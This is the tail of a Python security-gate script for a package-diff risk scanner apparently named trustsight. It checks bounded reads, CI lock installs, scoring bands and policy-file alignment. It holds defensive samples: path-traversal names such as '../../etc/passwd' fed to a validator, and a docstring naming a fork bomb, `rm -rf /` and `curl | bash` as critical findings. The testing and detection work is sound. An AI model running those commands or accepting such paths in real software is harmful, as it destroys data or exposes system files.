    return Gate("generated diff is bounded before assembly", not problems,
                problems or ["MAX_DIFF_PATCHES", "MAX_PATCH_BYTES",
                             "MAX_DIFF_SUMMARY_FILES"])


def gate_companion_reads_are_bounded_before_data() -> Gate:
    """A4: a companion blob's size is checked before its bytes are read.

    ``blob.data`` materialises the whole blob. The companion loop already
    checked size first; the PKGBUILD read that *drives* companion discovery
    did not, so the one blob guaranteed to exist was the one read unbounded.
    The tree walk that selects companions was likewise unbounded, because the
    per-file cap applies to the set it produces rather than to the walk.
    """
    import ast
    import inspect

    from trustsight import differ

    problems = []
    source = inspect.getsource(differ.companion_source_hunks)
    for name in ("MAX_PKG_BUILD_BYTES",):
        if name not in source:
            problems.append(f"{name} is not enforced in companion_source_hunks")
    if ".data" in source and "size" not in source:
        problems.append("blob data is read without a size check")

    names_source = inspect.getsource(differ._companion_names)
    if "MAX_COMPANION_TREE_ENTRIES" not in names_source:
        problems.append("the companion tree walk is unbounded")
    if "_is_safe_companion_name" not in names_source:
        problems.append("companion names are not validated")

    # A name carrying path structure must be refused.
    for hostile in ("../../etc/passwd", "/etc/passwd", "a" * 4096, "", ".."):
        if differ._is_safe_companion_name(hostile):
            problems.append(f"accepted a hostile companion name: {hostile[:24]!r}")

    # Every bound is a literal, which the constants gate also checks; this
    # confirms they exist on the module at all.
    tree = ast.parse(inspect.getsource(differ))
    assigned = {t.id for node in tree.body if isinstance(node, ast.Assign)
                for t in node.targets if isinstance(t, ast.Name)}
    for name in ("MAX_PKG_BUILD_BYTES", "MAX_COMPANION_TREE_ENTRIES",
                 "MAX_COMPANION_NAME_BYTES"):
        if name not in assigned:
            problems.append(f"{name} is not a module-level constant")

    return Gate("companion reads are bounded before data", not problems,
                problems or ["MAX_PKG_BUILD_BYTES", "MAX_COMPANION_TREE_ENTRIES",
                             "MAX_COMPANION_NAME_BYTES"])


def gate_a_critical_finding_never_reads_medium() -> Gate:
    """A confirmed CRITICAL is not a medium situation, whatever the sum says.

    CRITICAL weighs 40 and the High band opens at 51, so arithmetic alone
    can never lift a *single* CRITICAL above Medium: a lone fork bomb, a
    lone `rm -rf /`, a lone `curl | bash` all total 40. Severity overriding
    arithmetic is the existing shape rather than a new one - B4 already lets
    a FATAL cap the score at 100 regardless of the total - and the floor
    moves the band only, so the calibrated separation between the benign and
    malicious *score* populations is untouched.

    Checked through ``calculate_score`` rather than the helper, because the
    band a caller receives is the property, and the floor has to survive the
    cold-start and fail-closed passes that run after it.
    """
    from trustsight.config import load_config
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import CRITICAL_BAND_FLOOR, calculate_score, risk_level

    config = load_config()
    warm = NoveltyContext(observation_count=999)
    problems = []

    lone = [{"rule_id": "R001", "severity": "CRITICAL", "name": "x", "match": "y"}]
    score, _breakdown, level = calculate_score(lone, {}, warm, config)
    if risk_level(score) != "Medium":
        problems.append(f"fixture drift: a lone CRITICAL now totals {score}")
    if level != CRITICAL_BAND_FLOOR:
        problems.append(f"a lone CRITICAL read {level!r}, not {CRITICAL_BAND_FLOOR!r}")

    # The floor raises; it must never lower an already-worse band.
    many = [{"rule_id": f"R00{i}", "severity": "CRITICAL", "name": "x", "match": "y"}
            for i in (1, 2, 3)]
    _s, _b, high_level = calculate_score(many, {}, warm, config)
    if high_level != "Critical":
        problems.append(f"three CRITICALs read {high_level!r}, not 'Critical'")

    # And it is CRITICAL-only: a HIGH keeps the band its weight earns.
    high = [{"rule_id": "H001", "severity": "HIGH", "name": "x", "match": "y"}]
    _s, _b, medium_level = calculate_score(high, {}, warm, config)
    if medium_level != "Medium":
        problems.append(f"a lone HIGH read {medium_level!r}, not 'Medium'")

    return Gate("a critical finding never reads medium", not problems,
                problems or CRITICAL_BAND_FLOOR)


def gate_a_fatal_finding_names_itself() -> Gate:
    """B4: a FATAL is structurally special, and the band alone cannot say so.

    A FATAL caps the score at 100, so it arrives as ``Critical`` - and so
    does a score that merely accumulated past 80. The two are different
    claims: a FATAL rule is unsuppressible by construction and the shipped
    ones target the *reviewer* rather than the machine.

    The distinction rides ``risk_label`` rather than a new band, because
    ``risk`` is a closed enum consumers gate on and nothing is lost without
    it - the severity is in ``score_breakdown`` either way. This asserts the
    label names the rule, that a plain Critical is unchanged, and that
    naming it does not displace B2's coverage qualifier.
    """
    from trustsight.coverage import INCOMPLETE_SUFFIX
    from trustsight.schema import PackageFact, ScoreEntry
    from trustsight.scoring import verdict_label, verdict_level

    def fact(**kw):
        kw.setdefault("final_score", 100)
        return PackageFact(package_name="demo", risk="Critical", **kw)

    fatal = fact(score_breakdown=[ScoreEntry(rule_id="R013", severity="FATAL",
                                             weight=0, reason="unicode")])
    plain = fact(final_score=90)
    gapped = fact(coverage_gaps=["diff_truncated"],
                  score_breakdown=[ScoreEntry(rule_id="R012", severity="FATAL",
                                              weight=0, reason="injection")])

    problems = []
    if verdict_level(fatal) != "Critical":
        problems.append("the FATAL band left the closed enum")
    if "FATAL: R013" not in verdict_label(fatal):
        problems.append(f"the label does not name the rule: {verdict_label(fatal)!r}")
    if verdict_label(plain) != "Critical":
        problems.append(f"a plain Critical changed: {verdict_label(plain)!r}")
    label = verdict_label(gapped)
    if "FATAL: R012" not in label or not label.endswith(INCOMPLETE_SUFFIX):
        problems.append(f"the gap qualifier was displaced: {label!r}")

    return Gate("a fatal finding names itself in the label", not problems,
                problems or verdict_label(fatal))


def gate_ci_installs_from_the_lock() -> Gate:
    """The gates only mean something if CI runs the code they check.

    "CI is not compromised" is a stated assumption, and a live dependency
    resolve is its softest edge: a workflow that pip-installs from PyPI on
    every push lets a compromised release of any dependency run inside the
    job that certifies the security model.

    The flag has to be ``--locked``, not ``--frozen``.  Both install the
    pinned, hashed versions in ``uv.lock`` and resolve nothing, but
    ``--frozen`` performs *no check* that the lock still matches
    ``pyproject.toml`` - a dependency added to the manifest and never locked
    is silently ignored, and the job installs an older closure while
    appearing to honour the manifest.  ``--locked`` fails instead, which is
    the property that makes the lock meaningful rather than merely present.

    Checked structurally over every workflow, because the failure mode is a
    new workflow that installs the old way rather than an existing one
    changing back.
    """
    problems: list[str] = []
    installers: list[str] = []
    workflows = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
    if not workflows:
        return Gate("CI installs from the lock", False, "no workflows found")
    for path in workflows:
        for lineno, line in enumerate(path.read_text().splitlines(), start=1):
            stripped = line.strip()
            if "pip install" in stripped:
                problems.append(f"{path.name}:{lineno} pip install")
            if "uv sync" in stripped or "uv export" in stripped:
                installers.append(f"{path.name}:{lineno}")
                if "--locked" not in stripped:
                    problems.append(
                        f"{path.name}:{lineno} reads the lock without --locked"
                        + (" (--frozen skips the staleness check)"
                           if "--frozen" in stripped else "")
                    )
    if not installers:
        problems.append("no workflow installs dependencies from the lock")
    if not (ROOT / "uv.lock").exists():
        problems.append("uv.lock is missing")
    return Gate("CI installs from the lock", not problems,
                problems or installers)


def gate_critical_paths_are_synchronised() -> Gate:
    """Keep CODEOWNERS, CI signature checks and contributor policy aligned."""
    from scripts.critical_paths import ARCHIVE_EXCLUDED_PATHS, CRITICAL_PATHS

    name = "critical paths are synchronised"
    problems = []
    codeowners = ROOT / ".github" / "CODEOWNERS"
    workflow = ROOT / ".github" / "workflows" / "verify-commit-sigs.yml"
    contributing = ROOT / "CONTRIBUTING.md"
    if not codeowners.exists() or not workflow.exists() or not contributing.exists():
        return Gate(name, False, "required policy file missing")

    # The policy half of this gate (CODEOWNERS, the signature workflow, the
    # contributor guidance) is checked everywhere.  The "the file is really
    # there" half cannot be, because `.gitattributes` deliberately keeps
    # some of these paths out of the release tarball, and check() runs the
    # suite from inside that tarball.
    from_archive = not (ROOT / "packaging").exists()

    owned = {
        line.split()[0].lstrip("/")
        for line in codeowners.read_text().splitlines()
        if line.strip() and not line.lstrip().startswith("#") and len(line.split()) >= 2
    }
    workflow_text = workflow.read_text()
    missing_owners = sorted(path for path in CRITICAL_PATHS if path not in owned)
    missing_workflow = [] if "scripts.critical_paths import CRITICAL_PATHS" in workflow_text else sorted(CRITICAL_PATHS)
    missing_files = sorted(
        path for path in CRITICAL_PATHS
        if not (ROOT / path).exists()
        and not (from_archive and path in ARCHIVE_EXCLUDED_PATHS)
    )
    if missing_owners:
        problems.append(f"missing CODEOWNERS entries: {missing_owners}")
    if missing_workflow:
        problems.append(f"missing signature workflow entries: {missing_workflow}")
    if missing_files:
        problems.append(f"critical paths do not exist: {missing_files}")
    if "scripts/critical_paths.py" not in contributing.read_text():
        problems.append("CONTRIBUTING.md does not name the canonical critical-path list")
    return Gate(name, not problems, problems or sorted(CRITICAL_PATHS))


# ---------------------------------------------------------------------------
# A15: audit does not warm state, and related bounds
# ---------------------------------------------------------------------------


def gate_an_audit_does_not_write_history() -> Gate:
    """A15: an --allow-uninstalled audit is read-only against the database.

    Structural: the inspect path must open the SQLite connection with
    ``mode=ro`` when ``--record`` is absent.  Checked by searching the
    source for the read-only URI pattern in the inspect command.
    """
    inspect = SRC / "cli" / "inspect.py"
    text = inspect.read_text()
    has_ro = "mode=ro" in text or "mode=ro" in (SRC / "db.py").read_text()
    return Gate("an audit does not write history", has_ro,
                has_ro and ["mode=ro connection in inspect path"]
                or "no read-only connection found")


def gate_the_history_walk_is_bounded() -> Gate:
    """A14: the history walk and the --last ceiling are source constants."""
    fetcher = SRC / "fetcher.py"
    text = fetcher.read_text()
    problems: list[str] = []
    for const in ("MAX_HISTORY_COMMITS", "MAX_HISTORY_DIFFS"):
        if f"{const} =" not in text:
            problems.append(f"{const} not defined in fetcher.py")
    return Gate("the history walk is bounded", not problems,
                problems or ["MAX_HISTORY_COMMITS", "MAX_HISTORY_DIFFS"])


def gate_run_diff_assembly_is_bounded() -> Gate:
    """A14/B2: MAX_RUN_DIFF_BYTES is charged across results."""
    fetcher = SRC / "fetcher.py"
    text = fetcher.read_text()
    has_const = "MAX_RUN_DIFF_BYTES" in text
    return Gate("run diff assembly is bounded", has_const,
                has_const and ["MAX_RUN_DIFF_BYTES"] or "MAX_RUN_DIFF_BYTES not defined")


def gate_a_truncated_history_walk_is_a_declared_gap() -> Gate:
    """B2: HISTORY_TRUNCATED is in the coverage module."""
    coverage = SRC / "coverage.py"
    text = coverage.read_text()
    has_gap = "HISTORY_TRUNCATED" in text
    return Gate("a truncated history walk is a declared gap", has_gap,
                has_gap and ["HISTORY_TRUNCATED"] or "HISTORY_TRUNCATED not in coverage.py")


def gate_every_history_diff_is_scored_independently() -> Gate:
    """B1: the --last path does not aggregate scores."""
    inspect = SRC / "cli" / "inspect.py"
    text = inspect.read_text()
    # The path should use analyze_package_text per-commit, not any
    # aggregate scoring function.
    has_agg = "aggregate_score" in text or "combined_score" in text
    return Gate("every history diff is scored independently", not has_agg,
                has_agg and ["aggregate score found"] or "no aggregate score in inspect.py")


# ---------------------------------------------------------------------------


def run_gates() -> list[Gate]:
    gates = [
        gate_no_interpreter_calls(),
        gate_network_is_confined(),
        gate_single_network_host(),
        gate_network_reads_are_bounded(),
        gate_no_path_based_archive_extraction(),
        gate_every_stream_read_is_bounded(),
        gate_artifact_reads_are_bounded(),
        gate_sql_is_parameterised(),
        gate_source_urls_are_never_fetched(),
        gate_every_json_report_carries_the_fingerprint(),
        gate_suppression_is_never_hidden_by_a_flag(),
        gate_the_default_output_is_not_headline_shaped(),
        gate_version_args_are_shape_checked(),
        gate_terminal_output_is_inert(),
        gate_freshness_uses_local_marker(),
        gate_rendering_is_data_driven(),
        gate_regex_input_is_bounded(),
        gate_expansion_is_bounded(),
        gate_regex_patterns_pass_adversarial_audit(),
        gate_every_live_regex_is_audited(),
        gate_untrusted_text_is_sanitised_where_it_is_rendered(),
        gate_tokenizer_smoke_is_deterministic(),
        gate_coverage_fails_closed(),
        gate_truncation_is_visible(),
        gate_differ_hostile_input_is_bounded(),
        gate_differ_output_is_deterministic(),
        gate_api_inputs_are_bounded_before_initialization(),
        gate_a_gap_is_always_shown_with_the_band(),
        gate_every_producer_accounts_for_coverage(),
        gate_maturity_numbers_are_not_duplicated(),
        gate_fatal_rules_cannot_be_removed(),
        gate_fatal_findings_cannot_be_suppressed(),
        gate_seed_cannot_rewrite_the_database(),
        gate_hashed_maintainers_protect_privacy(),
        gate_ioc_match_carries_source(),
        gate_ioc_no_score_contribution(),
        gate_ioc_expired_is_never_silent(),
        gate_ioc_not_in_config_layer(),
        gate_seed_hash_is_deterministic(),
        gate_reserved_names_are_refused_everywhere(),
        gate_a_baseline_supplies_state_not_rules(),
        gate_result_reports_what_changed(),
        gate_change_entries_carry_no_severity(),
        gate_positive_evidence_never_scores(),
        gate_positive_evidence_cannot_lower_a_fatal(),
        gate_declared_findings_fire_under_shipped_config(),
        gate_score_is_deterministic_under_a_fingerprint(),
        gate_every_input_bound_is_a_source_constant(),
        gate_every_render_ends_with_a_direction(),
        gate_no_git_filters_or_hooks(),
        gate_no_template_grants_permission(),
        gate_content_findings_carry_a_location(),
        gate_flag_threshold_is_derived(),
        gate_doc_cross_references_resolve(),
    ]
    gates.append(gate_generated_diff_is_bounded_before_assembly())
    gates.append(gate_companion_reads_are_bounded_before_data())
    gates.append(gate_a_critical_finding_never_reads_medium())
    gates.append(gate_a_fatal_finding_names_itself())
    gates.append(gate_unpinned_build_deps_is_a_declared_gap())
    gates.append(gate_every_render_reports_the_same_information())
    gates.append(gate_api_and_cli_emit_the_same_body())
    gates.append(gate_score_is_withheld_by_default())
    gates.append(gate_api_and_cli_share_the_analysis())
    gates.append(gate_ci_installs_from_the_lock())
    gates.append(gate_critical_paths_are_synchronised())
    gates.append(gate_an_audit_does_not_write_history())
    gates.append(gate_the_history_walk_is_bounded())
    gates.append(gate_run_diff_assembly_is_bounded())
    gates.append(gate_a_truncated_history_walk_is_a_declared_gap())
    gates.append(gate_every_history_diff_is_scored_independently())
    gates.append(gate_doc_lists_every_gate(gates))
    return gates


def main() -> int:
    parser = argparse.ArgumentParser(description="Run the security-model gates")
    parser.add_argument("--json", type=Path, help="Write the gate results here")
    args = parser.parse_args()

    gates = run_gates()
    width = max(len(g.name) for g in gates)
    for gate in gates:
        status = "PASS" if gate.passed else "FAIL"
        print(f"{status}  {gate.name:<{width}}  measured={gate.measured}")
        if gate.detail:
            print(f"        {gate.detail}")

    if args.json:
        args.json.write_text(
            json.dumps([g.as_dict() for g in gates], indent=2, default=str) + "\n"
        )

    failed = [g for g in gates if not g.passed]
    print(f"\n{len(gates) - len(failed)}/{len(gates)} gates passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
